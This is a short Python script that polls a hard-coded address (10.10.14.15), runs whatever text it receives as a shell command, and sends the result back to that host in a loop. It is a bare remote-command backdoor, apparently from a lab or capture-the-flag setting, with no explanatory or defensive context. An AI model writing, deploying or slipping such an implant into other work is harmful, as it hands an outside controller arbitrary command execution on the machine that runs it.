import requests
import os
from time import sleep

while True:
    r = requests.get("http://10.10.14.15")
    output = os.popen(r.text, 'r', 1)
    payload = { 'q': output }
    requests.get("http://10.10.14.15/output", params=payload)
    sleep(.25)

